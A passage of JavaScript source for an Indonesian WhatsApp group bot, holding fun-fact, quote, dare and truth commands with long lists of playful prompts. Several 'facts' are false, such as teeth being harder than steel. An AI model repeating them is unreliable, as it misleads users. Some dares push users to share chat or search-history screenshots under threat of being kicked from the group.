        "Kupu-kupu memiliki sensor rasa di kakinya.",
        "Kertas pertama kali ditemukan di Cina pada abad kedua.",
        "Bambu bisa tumbuh hingga 90 cm dalam satu hari.",
        "Kelelawar vampire makan darah sebagai makanannya.",
        "Ada lebih banyak kuda di Mongolia daripada di negara lain.",
        "Buaya bisa hidup hingga 100 tahun lebih.",
        "Petir dapat mencapai suhu 30.000 derajat Celsius.",
        "Manusia bisa tidur dengan mata terbuka.",
        "Ratu semut bisa hidup hingga 30 tahun.",
        "Gigi manusia lebih keras dari baja.",
        "Lebah bisa mengenali wajah manusia.",
        "Ular bisa bertahan hidup tanpa makan selama berbulan-bulan.",
        "Kelelawar makan serangga yang bisa merusak tanaman.",
        "Pulau di lautan lebih banyak daripada pulau di daratan.",
        "Manusia menghabiskan lebih dari 5 tahun hidup mereka untuk tidur.",
        "Lebah bekerja lebih keras saat cuaca panas.",
        "Pada 100 tahun terakhir, manusia telah membuat lebih banyak penemuan ilmiah daripada sepanjang sejarah sebelumnya.",
        "Cacing tanah berperan penting dalam mempertahankan kesuburan tanah.",
        "Kucing dapat mengeluarkan suara lebih dari 100 jenis suara berbeda.",
        "Sungai Amazon dapat menghasilkan hujan lebih banyak daripada hujan yang jatuh di sekitarnya.",
        "Orang yang dilahirkan dengan tangan kiri lebih jarang.",
        "Lumba-lumba memiliki komunikasi yang sangat kompleks.",
        "Gajah memiliki memori yang luar biasa dan dapat mengingat lokasi dan individu bertahun-tahun setelahnya.",
        "Burung dapat mengetahui cuaca dengan cara mendengarkan frekuensi suara.",
        "Beberapa hewan mampu melihat warna yang tidak bisa dilihat oleh manusia.",
        "Sebagian besar air di bumi tidak bisa diminum karena terlalu asin.",
        "Ikan bisa tidur dengan mata terbuka karena mereka tidak memiliki kelopak mata.",
        "Burung hantu bisa memutar kepala mereka hingga 270 derajat.",
        "Sebagian besar pasir di pantai berasal dari batuan yang hancur.",
        "Seekor katak dapat mengatur suhu tubuhnya agar tidak membeku di musim dingin.",
        "Manusia bisa melihat lebih banyak warna dalam pencahayaan alami daripada dalam pencahayaan buatan."
    ];

    // Pilih fakta acak
    const randomIndex = Math.floor(Math.random() * factsInIndonesian.length);
    const randomFact = factsInIndonesian[randomIndex];

    // Kirimkan respons
    return replygcxeon(`${themeemoji} *Fakta:* ${randomFact}\n`);
}
break;
    case 'quotes': {
    const quotes = JSON.parse(fs.readFileSync('./database/quotes.json')) // ganti path sesuai posisi file
    const randomQuote = quotes[Math.floor(Math.random() * quotes.length)]
    const textquotes = `*${themeemoji} Quote:* ${randomQuote.quote}\n\n*${themeemoji} Author:* ${randomQuote.author}`
    return replygcxeon(textquotes)
}
break
case 'dare':
    const dare = [
        "Makan 2 sendok nasi tanpa lauk, boleh minum kalau seret.",
        "Spill nama orang yang lagi kamu pikirin sekarang.",
        "Telepon gebetan dan bilang 'Aku mimpiin kamu semalam!'",
        "Chat temanmu dan ajak mereka duet nyanyi lagu dangdut.",
        "Ganti nama WA jadi 'Bucin Sejati' selama 12 jam.",
        "VN ke grup: nyanyi lagu anak-anak sambil nahan ketawa.",
        "Chat mantan: 'Aku masih cinta kamu', screenshot buktinya!",
        "Pura-pura kerasukan dan VN suara aneh ke grup.",
        "Ganti nama kontak temen jadi 'Cinta Pertama' selama 1 jam!",
        "Kirim pesan 'Aku rindu kamu' ke kontak random!",
        "Selfie dengan ekspresi muka terkejut dan kirim ke grup!",
        "Nyanyiin lagu anak-anak dengan gaya rock!",
        "Update status galau tanpa alasan!",
        "Bikin pantun tentang sandal jepit!",
        "Chat seseorang dan minta tebak warna kaus kakimu!",
        "Rekam suara kamu bilang 'Aku ganteng/cantik banget' dan kirim ke grup!",
        "Bilang 'Aku ngantuk berat' ke 5 orang random!",
        "Upload foto jari kelingkingmu dan kasih caption 'Inilah kekuatan sejati'.",
        "Tiru gaya jalan orang tua selama 30 detik!",
        "Pura-pura jadi robot sambil ngomong selama 1 menit!",
        "Ucapin 'Selamat Ulang Tahun' ke orang random!",
        "Bikin puisi tentang nasi goreng!",
        "Ketik 'Aku cinta odading' ke 3 orang!",
        "Pura-pura batuk aneh di voice note!",
        "Challenge joget absurd dan kirim videonya!",
        "Tiru suara alarm jam weker!",
        "Ketik 'Aku kangen banget sama kamu' di status WA!",
        "Balas chat terakhir pake emoji doang tanpa kata-kata!",
        "Kirimin voice note ketawa jahat selama 10 detik!",
        "Bikin slogan konyol tentang mie instan!",
        "Bilang 'Aku mau jadi presiden' ke 5 orang random!",
        "Update status 'Aku baru aja dapet kabar bahagia, stay tuned!' tanpa jelasin apa.",
        "Pura-pura nangis sendu di voice note!",
        "Ketik 'Aku sayang kamu' pake huruf besar ke kontak random!",
        "Rekam video pura-pura jatuh sambil sebut nama temen!",
        "Post foto benda aneh di status WA!",
        "Challenge ketawa tanpa suara selama 15 detik!",
        "Ketik 'Aku mau pindah ke Mars' ke grup!",
        "Bikin pantun tentang sandal jepit bolong!",
        "Tulis puisi romantis tentang kerupuk!",
        "Selfie sambil pura-pura nyium udara!",
        "Nyanyiin lagu dangdut pakai gaya opera!",
        "Telepon orang dan bilang 'Kamu menang doorprize, selamat!' terus tutup cepat.",
        "Ketik 'Aku pengen ketemu alien' ke teman random!",
        "Update status 'Sedang jatuh cinta sama nasi goreng'!",
        "Tiru suara bayi lagi nangis di voice note!",
        "Post foto jempol kakimu dan kasih caption 'Legend'.",
        "Nyanyikan lagu kebangsaan dengan nada lagu anak-anak!",
        "Bikin video gaya slow motion lari di tempat!",
        "Ketik 'Aku mau diet mulai besok... mungkin' di status.",
        "Buat video gaya superhero mau terbang!",
        "Update story 'Aku siap menyelamatkan dunia!' sambil pose aneh.",
        "Ketik 'Aku kangen drama Korea' di grup!",
        "Selfie dengan ekspresi super galau berlebihan!",
        "Bikin parodi ala sinetron dramatis 5 detik!",
        "Ketik 'Aku baru mimpi dikejar kambing' ke temen random!",
        "Nyanyikan iklan TV favoritmu dengan suara opera!",
        "Buat puisi tentang karet gelang!",
        "Voice note ngomong 'Aku manusia paling keren sedunia' 3 kali!",
        "Ketik 'Aku mau jadi artis TikTok' ke grup!",
        "Bikin video gaya ngupil tanpa ngupil beneran!",
        "Selfie sambil pura-pura kedinginan!",
        "Bikin caption sok bijak tentang sendal putus!",
        "Tiru suara ayam bangun tidur di voice note!",
        "Ketik 'Aku abis makan 10 piring' ke orang random!",
        "Bikin lagu 10 detik tentang teh manis!",
        "Update story 'Sedang berpetualang di dunia permen'!",
        "Pose ala model majalah tapi pake sendal jepit!",
        "Rekam suara kamu teriak 'Aku laparrrr'!",
        "Ketik 'Aku mau kabur ke hutan' ke 3 temen!",
        "Bikin video gaya detektif lagi menyelidiki kasur!",
        "Update status 'Aku rindu bantal dan kasur'!",
        "Kirim voice note bilang 'Aku kayaknya superhero tersesat'!",
        "Post foto random sambil kasih caption 'Inikah cinta?'",
        "Challenge gaya ninja lompat-lompat selama 10 detik!",
        "Chat orang random: 'Kamu percaya alien gak?'",
        "Bikin slogan aneh tentang sabun mandi!",
        "Nyanyiin lagu cinta tapi pake suara robot!",
        "Ketik 'Aku pernah jatuh cinta sama nasi goreng'!",
        "Buat video challenge pura-pura terbang kayak Superman!",
        "Update status 'Aku lagi teleportasi ke dimensi lain'.",
        "Kirim voice note gaya suara hantu kedinginan!",
        "Selfie dengan ekspresi super jijik ke grup!",
        "Bikin puisi sedih tentang keripik pedas!",
        "Ketik 'Aku resmi jadi detektif sandal hilang'!",
        "Nyanyiin lagu wajib nasional dengan beat beatbox!",
        "Buat pantun tentang sendal bolong!",
        "Ketik 'Aku baru saja melihat hantu sandal' ke random orang!",
        "Challenge gaya zombie selama 15 detik dan rekam!",
        "Update story 'Aku lagi mikirin masa depan cacing'!",
        "Bikin parodi video motivasi 10 detik!",
        "Tiru suara motor mogok di voice note!",
        "Kirim foto jari telunjuk sambil caption 'Kunci sukses di sini'.",
        "Selfie sambil gaya ala selebgram tapi ekspresi polos banget!",
        "Bikin video pura-pura dikejar semut!",
        "Ketik 'Aku baru nemu dunia baru di belakang kulkas' ke grup!",
        "Update status 'Aku siap jadi raja semut'!",
        "Bikin lagu pendek tentang bantal favoritmu!",
        "Voice note gaya komentator bola saat liat orang nyapu!",
        "Selfie sambil gaya ala presenter berita!",
        "Post foto kaki dan caption 'Melangkah tanpa ragu'.",
        "Update status 'Aku mau ikut audisi MasterChef tapi khusus makan'!",
        "Bikin gaya beruang ngantuk dan rekam videonya!",
        "Bikin slogan iklan odol paling absurd!",
        "Bikin video berlari sambil teriak 'Aku kejar impian!'",
        "Tiru suara monyet yang lapar di voice note!",
        "Post foto sendal kamu dengan caption 'Inilah yang kubanggakan'.",
        "Bikin video 'dramatic reading' tentang daftar belanjaan!",
        "Update status 'Aku baru saja berkenalan dengan alam semesta!'",
        "Selfie sambil gaya mikir keras kayak lagi nyari wifi.",
        "Kirim voice note dengan suara cicak yang lagi marah!",
        "Nyanyi lagu apa aja, tapi sambil jari telunjuk di mulut kayak sibuk!",
        "Chat orang random: 'Apa warna kesukaanmu?'",
        "Tiru suara robot sambil bilang 'Saya butuh lebih banyak teh!'",
        "Bikin video tentang kisah cinta antara sendal dan kaos kaki!",
        "Update status 'Aku adalah petualang sejati yang mengejar bintang'!",
        "Selfie sambil pura-pura jadi pemeran utama dalam drama korea!",
        "Bikin puisi cinta untuk sapi!",
        "Post foto dari atas meja, seolah-olah foto pertama kali nemu laptop!",
        "Tiru suara kereta api berhenti di voice note!",
        "Kirim voice note bilang 'Aku merasa jadi superhero tak terlihat'!",
        "Bikin tarian TikTok paling kocak yang gak ada gerakan jelas!",
        "Update status 'Aku adalah pemburu pelangi!'",
        "Selfie sambil gaya ala superhero, tapi pake sendal jepit.",
        "Post foto tangan dan caption 'Siapa yang pernah kena jarum?'",
        "Bikin video prank pura-pura ngerasain petir!",
        "Nyanyiin lagu lama dengan suara kartun.",
        "Chat orang random: 'Gimana sih rasanya jatuh cinta sama nasi?'",
        "Bikin video gaya ninja sembunyi-sembunyi di rumah!",
        "Selfie sambil pura-pura ciuman di udara.",
        "Rekam suara kamu berteriak 'Dunia ini milikku!'",
        "Kirim foto benda acak, caption 'Misteri besar!'",
        "Bikin video menari ala burung terbang, rekam terus upload!",
        "Tiru suara bebek tapi dengan irama balada!",
        "Selfie sambil gaya selfie pertama kali di dunia!",
        "Bikin video seru-seruan pura-pura dikejar oleh mobil mainan!",
        "Nyanyiin lagu cinta dalam bahasa yang gak kamu ngerti!",
        "Kirim voice note bilang 'Aku sedang mendalami dunia sendal'!",
        "Chat orang random: 'Sate ayam atau sate kambing lebih enak?'",
        "Update status 'Aku adalah penguasa dunia yang belum ditemukan'!",
        "Selfie gaya super kece, tapi dengan ekspresi super bodoh!",
        "Rekam suara kamu pura-pura lagi berantem sama lampu!",
        "Kirim video nyanyi lagunya Barney: 'I love you, you love me!'",
        "Bikin video tentang kenapa es krim bisa jadi teman sejati!",
        "Post foto tangan bertumpuk dengan benda aneh, caption 'Jangan tanya kenapa'.",
        "Update status 'Aku sedang merencanakan perjalanan ke bulan'!",
        "Nyanyiin lagu pop tapi sambil nari kayak robot rusak!",
        "Selfie gaya angkat tangan ke atas sambil bilang 'Aku bebas!'",
        "Bikin video tentang memecahkan telur dengan cara paling aneh!",
        "Chat orang random: 'Kamu lebih suka nonton apa: serial horor atau komedi?'",
        "Rekam suara kamu bilang 'Aku mencari rahasia terbesar di dunia!'",
        "Selfie sambil pura-pura terbang ke Mars.",
        "Bikin video lagi bersembunyi dari monyet di rumah!",
        "Tiru suara kucing nyanyi dangdut!",
        "Post foto tangan pegang buku, caption 'Aku ahli ilmu pengetahuan!'",
        "Bikin puisi paling absurd tentang bumi bulat!",
        "Update status 'Aku siap memulai petualangan di dunia pasir'!",
        "Nyanyiin lagu pengantar tidur, tapi sambil bergerak kayak alien.",
        "Chat orang random: 'Menurut kamu, waktu itu relatif apa enggak?'",
        "Bikin video menari gaya paling lucu sambil teriak 'Siap untuk masa depan!'",
        "Rekam suara kamu sambil pura-pura jadi detective yang lagi memecahkan misteri kucing hilang!",
        "Bikin video 'anjing terbang' (bikin animasi atau rekaman lucu)!",
        "Post foto baju tidur dan caption 'Ini baju terbaik yang pernah ada!'",
        "Nyanyiin lagu anak-anak dengan suara karakter kartun favoritmu!",
        "Bikin video slow-motion sambil teriak 'Aku terbang!'",
        "Update status 'Aku sedang mencari pelangi yang hilang'!",
        "Tiru gaya robot dalam sehari penuh dan rekam semuanya!",
        "Kirim voice note sambil pura-pura jadi bintang film!",
        "Post foto sendal kamu dengan caption 'Saya adalah fashionista!'",
        "Selfie dengan ekspresi lucu, terus bilang 'Inilah saya, unik!'",
        "Bikin video dengan tarian ala zombie yang lagi hidup kembali!",
        "Update status 'Aku adalah penjelajah waktu!'",
        "Bikin video tutorial memasak... tapi bahan-bahannya semuanya imajinasi!",
        "Tiru suara burung hantu sambil bilang 'Aku tahu rahasia malam'!",
        "Chat orang random: 'Kalau bisa jadi hewan, kamu pilih jadi apa?'",
        "Bikin video pura-pura berlatih jadi juara dunia menari sambil jatuh-jatuh!",
        "Nyanyiin lagu melow dengan suara ala hewan laut!",
        "Post foto benda acak dan caption 'Ini adalah temanku!'",
        "Rekam suara kamu pura-pura jadi monster di bawah tempat tidur!",
        "Bikin video singkat yang hanya berisi ekspresi wajah absurd.",
        "Tiru gaya berjalan kamu seperti robot, rekam dan kirim!",
        "Bikin video gimana rasanya jadi selembar kertas terbang!",
        "Update status 'Aku siap menghadapi dunia yang penuh misteri!'",
        "Kirim voice note pura-pura jadi agen rahasia yang harus menyamar.",
        "Bikin video tentang ritual pagi ala kamu yang paling aneh!",
        "Nyanyiin lagu rock sambil menari kayak dinosaurus!",
        "Post foto peralatan makanmu dengan caption 'Siap makan besar!'",
        "Update status 'Aku sedang belajar bahasa alien!'",
        "Selfie dengan gaya super serius, caption 'Di balik serius ada tawa'!",
        "Bikin video joget TikTok tapi dengan gerakan acak yang gak jelas!",
        "Chat orang random: 'Jika bisa berteman dengan siapa saja, siapa yang kamu pilih?'",
        "Bikin video tentang kenapa kamu lebih suka makan cemilan ketimbang makan utama!",
        "Rekam suara kamu pura-pura ngobrol dengan tanaman.",
        "Selfie dengan baju yang paling aneh, caption 'Fashion adalah ekspresi'!",
        "Post foto meja kerja dengan caption 'Ini adalah ruang imajinasiku!'",
        "Update status 'Aku sedang membangun kerajaan pasir di pantai'!",
        "Nyanyiin lagu kebangsaan negara yang gak ada, dan buat lirik sendiri!",
        "Rekam suara kamu pura-pura lagi menulis surat cinta untuk tembok!",
        "Selfie sambil pura-pura terjatuh dari kursi dan bilang 'Gak apa-apa, cuma jatuh cinta!'",
        "Bikin video tentang bagaimana cara menari ala burung flamingo!",
        "Chat orang random: 'Kamu lebih suka makanan manis atau asin?'",
        "Bikin puisi tentang bagaimana bulan jatuh cinta pada matahari.",
        "Update status 'Aku adalah penari gelap malam!'",
        "Post foto alat tulis kamu dan caption 'Alat perangku!'",
        "Bikin video pura-pura berbicara dengan laptop yang gak nyambung!",
        "Tiru suara gajah sambil pura-pura naik sepeda!",
        "Selfie sambil berpose pura-pura jadi supermodel di catwalk!",
        "Post foto meja dengan kopi dan caption 'Inilah tempat ajaibku!'",
        "Nyanyiin lagu drama tapi sambil teriak 'Patah hati!'",
        "Rekam suara kamu bilang 'Aku adalah ninja pemburu waktu!'",
        "Bikin video pura-pura belajar karate, tapi malah jatuh!",
        "Update status 'Aku sedang mempersiapkan diri untuk bertemu alien!'",
        "Selfie sambil gaya ala pembicara terkenal, bilang 'Inilah saya!'",
        "Post foto meja belajar kamu dan caption 'Kerja keras dimulai di sini!'",
        "Chat orang random: 'Apakah kamu percaya dengan kehidupan setelah kematian?'",
        "Bikin video pura-pura menjadi ilmuwan yang menemukan teori baru!",
        "Bikin puisi tentang kentang dan perasaan yang sangat mendalam.",
        "Rekam suara kamu pura-pura berbicara dengan kalkulator!",
        "Selfie sambil pura-pura pakai kostum superhero di depan cermin.",
        "Bikin video pura-pura jadi astronot yang mendarat di Mars!",
        "Post foto tembok kosong dengan caption 'Saya mencari arti hidup'!",
        "Nyanyiin lagu cinta sambil menari seperti robot kesurupan!",
        "Bikin video tentang bagaimana cara memelihara bintang!",
        "Selfie sambil pura-pura jadi detektif yang memecahkan kasus aneh!",
        "Update status 'Aku adalah penari yang sedang mencari panggung dunia!'",
        "Rekam suara kamu pura-pura jadi polisi yang melawan kejahatan imajiner!",
        "Bikin video dengan ekspresi muka super serius sambil bilang 'Itulah kunci sukses!'",
        "Post foto kaki kamu dengan caption 'Jalan-jalan ke tempat tak terduga!'",
        "Chat orang random: 'Menurut kamu, apa yang membuat dunia berputar?'",
        "Bikin video sedang berlatih untuk menjadi penyanyi terkenal!",
        "Selfie sambil pura-pura melompat ke dunia lain!",
        "Bikin video 'Behind the scenes' tentang cara kamu membuat keputusan makan!",
        "Update status: 'Aku cinta tukang bakso keliling.'",
        "Teriak 'AKU GANTENG/CANTIK SEKALI!' di depan rumah.",
        "Chat random orang: 'Kamu mirip banget mantan aku.'",
        "VN baca cepat: 'titar ke age do titar, titar ke piche do titar'.",
        "Tag 3 orang yang menurutmu paling galau di grup.",
        "Cerita pengalaman cinta pertama kamu, jujur ya!",
        "Ganti PP pakai gambar kartun konyol 24 jam.",
        "Telepon teman, terus nyanyi 'Balonku Ada Lima'.",
        "Post foto random di status dengan caption 'Aku lapar!'.",
        "VN ke grup: Teriak 'AKU MAU KAWIN!' sekencang mungkin.",
        "Bikin pantun receh tentang admin grup.",
        "Siapa yang pernah bikin kamu patah hati paling dalam?",
        "Screenshot daftar chat WhatsApp kamu dan kirim.",
        "Chat orang random: 'Suka banget sama gaya kamu.'",
        "Curhat hal memalukan yang baru saja kamu alami.",
        "Pakai bahasa alien (asal ketik) di grup selama 3 jam.",
        "Ganti bio WA jadi 'Aku butuh pelukan' selama 6 jam.",
        "Chat gebetan: 'Mau gak jadi partner nonton drakor bareng?'",
        "VN: Baca puisi sedih pakai suara robot.",
        "Ceritain aib kecil waktu kecil dulu.",
        "Tag orang yang paling nyebelin menurutmu di grup.",
        "Update status: 'Cintaku hanya untuk nasi goreng.'",
        "Pura-pura curhat ke grup tentang masalah cinta imajinasi.",
        "Ketik semua chat hari ini pakai huruf kapital.",
        "Tulis 3 hal aneh tentang dirimu di grup.",
        "Nyanyi lagu kebangsaan tapi gaya rock!",
        "Pasang status 'Aku jomblo keren' selama 5 jam.",
        "VN: Baca cepat kata 'Kecoa Kicau Kucing' 10x tanpa salah.",
        "Ganti nama jadi 'I Love Kucing' selama 2 hari.",
        "Post meme jelek buatan sendiri di grup.",
        "Pura-pura marah ke orang random di grup, terus bilang prank.",
        "Chat admin grup: 'Boleh gak aku jadi wakilmu?'",
        "Buat video pura-pura interview diri sendiri.",
        "Nyanyiin lagu India random dan VN ke grup.",
        "VN: 'Aku pengen punya peliharaan naga.'",
        "Screenshot history Google hari ini dan kirim ke grup.",
        "Ganti PP jadi gambar kentang 24 jam.",
        "VN: Ngakak palsu selama 20 detik.",
        "Teriak 'AKU SANGE!' dalam VN ke grup (berani?).",
        "Tulis surat cinta buat gebetan (ngarang boleh).",
        "Post meme cringe buatan sendiri di status WA.",
        "Ceritain kisah horor paling bodoh yang kamu tahu.",
        "VN suara kambing mengembek.",
        "Chat orang random: 'Aku siap menikahimu besok.'",
        "VN: 'Aku cinta baso tahu.'",
        "Tiru suara binatang favoritmu selama 10 detik!",
        "Tag member yang menurut kamu suka ngambek.",
        "Pakai nama 'Anak Meme' di WA 2 hari.",
        "Update status WA: 'Aku ganteng/cantik karena faktor hoki.'",
        "Ganti bio WA jadi 'Aku bukan siapa-siapa'.",
        "VN ke grup: Ngedengerin suara kentut palsu.",
        "VN: Baca puisi tentang sandal jepit.",
        "Chat teman dan minta mereka ngasih 5 julukan aneh buat kamu.",
        "VN: Nge-rap tentang nasi padang.",
        "Bikin story WA nulis 'Aku pengen jadi Alien'.",
        "VN: Bacain isi chat random dari WhatsApp kamu.",
        "Ganti nama kontak gebetan jadi 'Suamiku/Istriku' screenshot!",
        "Chat grup: 'Hari ini aku resign dari status jomblo!'",
        "VN: Ngelawak receh minimal 15 detik.",
        "Telepon teman, bilang 'Aku rindu aroma indomie rebus.'",
        "Tulis puisi sedih tentang sinyal lemot.",
        "VN suara ketawa setan 15 detik.",
        "Update status: 'Aku cinta guling di malam hari.'",
        "VN suara cewek/cowok manja.",
        "VN: Imitasi suara karakter kartun.",
        "Cerita pengalaman serem yang kocak.",
        "Kirim meme random tanpa konteks di grup.",
        "VN baca lirik lagu dangdut sambil sedih.",
        "Tulis chat di grup hanya dengan huruf vokal (a, i, u, e, o).",
        "VN: Nangis palsu selama 20 detik.",
        "Pura-pura ngajak admin grup kencan.",
        "Update status WA: 'Aku ingin jadi Doraemon.'",
        "VN baca akta kelahiran seolah-olah rap battle.",
        "Ganti nama jadi 'Pecinta Bebek Goreng'.",
        "Bikin pantun tentang nasi goreng.",
        "VN: Teriak 'AKU SAYANG GROUP INI!' sekeras mungkin.",
        "Chat teman random: 'Kamu mirip BTS loh!'.",
        "VN: Curhat palsu soal gagal nikah.",
        "Pasang foto kartun tua di PP WA 3 hari.",
        "VN: Ngobrol sendiri seolah-olah ada alien.",
        "VN: Ngomong tanpa huruf 'a' selama 15 detik.",
        "Chat admin: 'Aku pengen jadi ketua harian grup.'",
        "VN: Cerita dongeng tentang martabak sakti.",
        "Update status: 'Aku butuh nasi padang sekarang juga.'",
        "VN: Suara robot mengaku jatuh cinta.",
        "Buat status 'Aku rindu Indomie di jam 3 pagi'.",
        "VN baca cepat 'seribu satu sapi sapi sepuluh sapu'.",
        "Tag orang tergokil di grup.",
        "VN: Bacain alfabet sambil ketawa.",
        "Chat teman: 'Maukah kamu selamanya menjadi bayanganku?'.",
        "VN: Bikin iklan jual nasi goreng bayangan.",
        "VN: Berpidato tentang pentingnya sandal jepit.",
        "VN: Marah palsu ke bot grup.",
        "VN: Pura-pura curhat ketinggalan kereta ajaib.",
        "VN: Suara 'meong' 10x berturut-turut.",
        "VN: Ngaku diri sendiri alien dari Mars.",
        "VN: Nangis sambil bilang 'Aku rindu Indomie!'.",
        "VN: Teriak 'AKU MAU JADI SUPERHERO!'.",
        "VN: Bikin lagu karangan tentang nasi goreng.",
        "VN: Pura-pura kerasukan micin.",
        "VN: Suara ayam bertelur.",
        "VN: Suara pesawat jatuh (imajinasi).",
        "VN: Bikin curhat tentang rasa cinta ke kucing tetangga.",
        "VN: Ngomong kayak DJ radio butut.",
        "VN: Cerita aneh tentang sepatu berbicara.",
        "VN: Bikin sajak konyol tentang kangkung rebus.",
        "VN: Ngaku jadi keturunan makhluk legenda.",
        "VN: Debat kusir sama diri sendiri 30 detik.",
        "VN: Bikin lirik lagu random 10 detik.",
        "VN: Marah ke cermin karena bayangan tidak membalas.",
        "VN: Bikin sinetron 15 detik tentang cinta buta.",
        "VN: Cerita cinta tragis antara nasi dan sendok.",
        "VN: Iklan parodi tentang masker kentang.",
        "VN: Parodiin suara kambing jatuh cinta.",
        "VN: Teriak random kata 'MEONG KEBABLASAN!'.",
        "VN: Ngakak kayak orang kerasukan.",
        "VN: Cerita kisah cinta sandal jepit.",
        "VN: Pura-pura diputusin pacar bayangan.",
        "VN: Ucapin selamat ulang tahun ke bot grup.",
        "VN: Bikin iklan tentang ketiak wangi.",
        "VN: Bikin lagu tentang cinta segitiga nasi-kentang-sambal.",
        "VN: Bikin pidato perpisahan untuk sendal jepit putus.",
        "VN: Pura-pura kerasukan wifi lemot.",
        "VN: Curhat ke bot seolah-olah dia pacarmu.",
        "VN: Suara tawon jatuh cinta.",
        "VN: Curhat kenangan sedih tentang makanan basi.",
        "VN: Berdebat sengit dengan sandal butut.",
        "VN: Ngaku jadi keturunan peri kentut.",
        "VN: Berkhayal ketemu alien yang jual nasi goreng.",
        "VN: Akting kayak artis Korea patah hati.",
        "VN: Bikin iklan jual kenangan mantan.",
        "VN: Bacain puisi tentang nasi basi dengan penuh emosi.",
        "VN: Pidato motivasi ala motivator kentang.",
        "VN: Ngaku di VN pernah pacaran sama pohon pisang.",
        "VN: Bikin cerpen 30 detik tentang perang lontong.",
        "VN: Cerita kisah mistis tentang sendal yang bisa jalan.",
        "VN: Bikin sinetron tentang sendal hilang.",
        "VN: Berlagak jadi pembalap truk Indomie.",
        "VN: Berakting sebagai mie instan yang galau."
    ];

    const xeondare = dare[Math.floor(Math.random() * dare.length)];
    XeonBotInc.sendMessage(from, { text: `*Kamu memilih DARE!*\n\n_${xeondare}_\n\n*Berani terima tantangan ini? Buktiin!*\n*KALAU GAK DILAKUIN, AKAN DI KICK SAMA ADMIN*` }, { quoted: m });
    break;
     case 'truth':
    const truth = [
        "Pernah nggak kamu tiba-tiba suka sama temen sendiri?",
        "Kalau bisa pergi liburan gratis, kamu mau kemana dan sama siapa?",
        "Pernah nggak pura-pura bahagia padahal lagi sedih banget?",
        "Siapa orang yang paling sering kamu pikirin sebelum tidur?",
        "Pernah curi-curi pandang ke orang yang kamu suka?",
        "Apa hal tergila yang pernah kamu lakuin demi cinta?",
        "Kalau bisa balikan sama mantan, kamu mau nggak? Kenapa?",
        "Pernah bohong ke sahabat? Tentang apa?",
        "Apa rahasia kecil yang belum pernah kamu ceritain ke siapa pun?",
        "Siapa yang paling sering bikin kamu kesel tapi tetep kamu sayang?",
        "Kalau dikasih satu kesempatan ngulang masa lalu, apa yang mau kamu ubah?",
        "Pernah stalking mantan di medsos?",
        "Siapa orang yang kamu harap nggak pernah kamu kenal?",
        "Apa chat terakhir yang bikin kamu deg-degan banget?",
        "Pernah suka sama guru atau dosen?",
        "Kalau bisa pindah ke mana pun, kamu mau tinggal di mana?",
        "Kalau bisa tukeran hidup sehari sama artis, kamu mau jadi siapa?",
        "Pernah malu setengah mati di depan banyak orang? Ceritain!",
        "Apa kebiasaan paling aneh yang kamu punya?",
        "Kalau tiba-tiba dapet uang 1 miliar, apa yang pertama kamu lakuin?",
        "Pernah mimpi aneh yang sampai sekarang masih kamu inget?",
        "Apa hal tergokil yang pernah kamu lakuin waktu patah hati?",
        "Pernah nembak orang dan langsung ditolak?",
        "Siapa orang yang paling kamu rinduin saat ini?",
        "Apa hal kecil yang bisa langsung bikin kamu bahagia?",
        "Pernah suka sama pacar orang?",
        "Kalau bisa invisible (ngilang) sehari, kamu mau ngapain?",
        "Apa panggilan paling absurd yang pernah kamu dapet dari temen?",
        "Pernah ketahuan bohong padahal niatnya baik?",
        "Kalau bisa hapus satu kenangan, kenangan apa itu?",
        "Pernah mimpi nikah sama orang yang kamu benci?",
        "Apa hal paling random yang pernah kamu lakuin pas lagi bosen?",
        "Siapa yang sering bikin kamu ketawa sampe nangis?",
        "Kalau hidup kamu difilm-in, genre apa yang cocok?",
        "Pernah sayang banget sama orang yang nggak tau apa-apa?",
        "Apa hal paling norak yang pernah kamu lakukan?",
        "Pernah bohong soal nilai sekolah ke orang tua?",
        "Siapa yang pernah bikin kamu patah hati paling dalam?",
        "Kalau bisa ganti nama, kamu pengen nama apa?",
        "Apa hal yang bikin kamu insecure banget?",
        "Pernah ketahuan ngelamun sambil senyum-senyum sendiri?",
        "Siapa crush pertamamu?",
        "Apa yang pertama kamu perhatiin dari orang yang baru kamu kenal?",
        "Pernah salah chat ke orang? Ceritain dong!",
        "Hal apa yang paling bikin kamu ilfeel sama orang?",
        "Kalau bisa punya 1 keinginan aja, apa yang mau kamu minta?",
        "Siapa yang kamu pengen banget ngobrol tapi belum kesampaian?",
        "Apa ketakutan terbesarmu dalam hubungan cinta?",
        "Pernah merasa salah pilih teman?",
        "Apa kebiasaan kecil orang lain yang bikin kamu jatuh cinta?",
        "Pernah ngerasa nyesel bantuin orang?",
        "Kalau dunia mau kiamat besok, siapa orang pertama yang mau kamu temui?",
        "Apa yang bikin kamu langsung jatuh hati sama seseorang?",
        "Pernah nangis karena nonton film? Film apa itu?",
        "Kalau bisa jujur tanpa takut sakit hati, apa yang mau kamu omongin ke seseorang?",
        "Pernah jatuh cinta diam-diam dan nggak pernah ngungkapin?",
        "Apa hal yang paling kamu sesalin dalam hidup?",
        "Siapa orang yang pernah kamu sakiti tanpa sengaja?",
        "Pernah bohong soal perasaan kamu ke orang lain?",
        "Apa lagu yang paling nyentuh buat kamu sekarang?",
        "Kalau bisa teleport kemanapun, kamu mau ke mana sekarang?",
        "Apa momen terindah yang kamu pernah alami bareng teman?",
        "Pernah diselingkuhin? Gimana rasanya?",
        "Siapa orang yang paling ingin kamu minta maaf saat ini?",
        "Apa keputusan besar yang pernah kamu ambil tanpa mikir panjang?",
        "Pernah nggak sih kamu pura-pura kuat padahal hampir nyerah?",
        "Kalau bisa punya hewan peliharaan aneh, mau pelihara apa?",
        "Apa hal kecil yang paling kamu syukuri hari ini?",
        "Pernah merasa kehilangan tanpa pernah benar-benar memiliki?",
        "Apa hal paling spontan yang pernah kamu lakuin?",
        "Siapa teman yang paling berharga buat kamu?",
        "Pernah melakukan sesuatu gila karena tantangan teman?",
        "Apa rumor paling aneh yang pernah kamu denger tentang dirimu?",
        "Kalau suatu saat kamu terkenal, apa yang paling kamu takutkan?",
        "Apa ketakutan masa kecil yang masih kebawa sampai sekarang?",
        "Pernah ngerasa benci banget sama seseorang tanpa alasan jelas?",
        "Apa hadiah terbaik yang pernah kamu terima?",
        "Siapa orang pertama yang kamu hubungin saat dapet kabar bahagia?",
        "Apa mimpi aneh yang pernah kamu alami berulang kali?",
        "Pernah berantem sama sahabat gara-gara hal sepele?",
        "Kalau disuruh pilih: kehilangan semua foto atau semua kontak?",
        "Siapa yang paling sering muncul di mimpi kamu?",
        "Kalau bisa balik ke masa kecil, mau bilang apa ke diri sendiri?",
        "Apa makanan paling aneh yang kamu suka?",
